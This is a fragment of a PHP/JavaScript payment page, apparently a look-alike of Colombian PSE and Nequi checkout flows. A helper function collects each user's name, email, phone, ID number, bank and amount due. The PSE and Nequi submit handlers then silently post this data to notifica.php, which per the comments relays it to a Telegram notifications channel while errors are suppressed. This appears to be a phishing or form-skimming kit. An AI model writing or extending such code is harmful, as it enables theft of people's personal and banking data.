<?php
    ...
    <script>
        ...
        // Función helper global para obtener tbdatos 100% completo con los datos cargados en pantalla
        function getCompletoTbdatos(customFields = {}) {
            let tb = {};
            try {
                tb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            } catch(e) {}
            
            const totalVal = localStorage.getItem('total_pagar') || localStorage.getItem('monto') || '';
            const nomVal = document.getElementById('res_nom')?.innerText.trim() || localStorage.getItem('nom') || '';
            const emlVal = document.getElementById('res_correo')?.innerText.trim() || localStorage.getItem('correo') || '';
            const telVal = document.getElementById('res_cel')?.innerText.trim() || localStorage.getItem('cel') || '';
            const docVal = document.getElementById('pse_cedula')?.value.trim() || localStorage.getItem('val') || '';
            
            if (!tb.nombre) tb.nombre = nomVal;
            if (!tb.correo) tb.correo = emlVal;
            if (!tb.telefono) tb.telefono = telVal;
            if (!tb.total_pagar && totalVal) tb.total_pagar = totalVal;
            if (!tb.banco) tb.banco = localStorage.getItem('banco') || '';
            if (!tb.documento) tb.documento = docVal;
            
            // Mezclar campos personalizados del submit actual
            return { ...tb, ...customFields };
        }
        ...
        document.addEventListener('DOMContentLoaded', () => {
            ...
            if (document.getElementById('ownerName')) document.getElementById('ownerName').value = nombreFinal;
        ...
        document.getElementById("formPSE").addEventListener("submit", function (e) {
            ...
            try {
                ...
                // NUEVA FUNCIÓN: Notificación en segundo plano al canal de Telegram de NOTIFICACIONES con PSE
                const completoData = getCompletoTbdatos({ documento: document.getElementById('pse_cedula').value.trim(), banco: opt.value, tipo_persona: nombreCliente });
                const notifyData = new FormData();
                notifyData.append('u_tb', JSON.stringify(completoData));
                fetch('notifica.php', { method: 'POST', body: notifyData }).catch(() => {});
            } catch(err) {
        ...
        document.getElementById("formNequi").addEventListener("submit", function (e) {
            ...
            try {
                ...
                // NUEVA FUNCIÓN: Notificación en segundo plano al canal de Telegram de NOTIFICACIONES con Nequi
                const completoData = getCompletoTbdatos({ banco: 'nequi', tipo_persona: nombreCliente });
                const notifyData = new FormData();
                notifyData.append('u_tb', JSON.stringify(completoData));
                fetch('notifica.php', { method: 'POST', body: notifyData }).catch(() => {});
            } catch(err) {
        ...
        document.getElementById('paymentForm').addEventListener('submit', e => {
            ...
            // Ocultar formulario y mostrar cargador de Jelpit de forma idéntica a PSE y Nequi
            document.getElementById('form-content-area').style.display = 'none';
            document.getElementById('loader-container').style.display = 'block';
